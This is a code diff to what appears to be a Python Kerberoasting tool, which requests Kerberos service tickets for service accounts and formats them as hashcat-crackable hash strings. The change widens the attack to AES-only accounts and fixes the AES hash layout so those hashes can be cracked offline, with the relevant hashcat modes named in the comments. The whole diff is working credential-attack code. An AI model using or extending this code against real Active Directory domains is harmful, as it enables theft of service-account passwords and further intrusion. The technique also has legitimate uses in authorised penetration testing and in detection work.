@@ -418,7 +418,11 @@ def _parse_asrep_tgt(data: bytes, key: bytes) -> tuple[bytes, bytes]:
 # --- TGS-REQ -> service ticket ---------------------------------------------------
 
 def _build_tgs_req(realm: str, user: str, spn: str, tgt: bytes, session_key: bytes) -> bytes:
-    body = _req_body(realm, _principal(2, spn.split("/")), None)
+    # Request RC4 preferred but AES (17/18) as fallback: an account with RC4 disabled
+    # (msDS-SupportedEncryptionTypes = AES-only, increasingly the default) would answer
+    # an RC4-only request with KDC_ERR_ETYPE_NOSUPP and be silently missed. tgs_hash
+    # formats whichever etype the KDC returns.
+    body = _req_body(realm, _principal(2, spn.split("/")), None, etypes=_ETYPES)
     cksum_val = krb_checksum_hmacmd5(session_key, _U_TGS_REQ_AUTH_CKSUM, body)
     cksum = _seq(_ctx(0, _int(CKSUM_HMAC_MD5)), _ctx(1, _octet(cksum_val)))
     authenticator = _tlv(0x62, _seq(                   # [APPLICATION 2] Authenticator
@@ -467,6 +471,12 @@ def tgs_hash(user: str, realm: str, spn: str, etype: int, cipher: bytes) -> str:
     if etype == ETYPE_RC4 and len(cipher) >= 16:
         return (f"$krb5tgs$23$*{user}${realm}${spn}*$"
                 f"{cipher[:16].hex()}${cipher[16:].hex()}")
+    # AES (17=aes128 -> hashcat 19600, 18=aes256 -> 19700): the 12-byte HMAC tag trails
+    # the ciphertext but the hash string leads with it, and user/realm sit OUTSIDE the
+    # *spn* asterisks (impacket GetUserSPNs layout) - the generic dump wasn't crackable.
+    if etype in (17, 18) and len(cipher) >= 12:
+        return (f"$krb5tgs${etype}${user}${realm}$*{spn}*$"
+                f"{cipher[-12:].hex()}${cipher[:-12].hex()}")
     return f"$krb5tgs${etype}$*{user}${realm}${spn}*${cipher.hex()}"
 
 
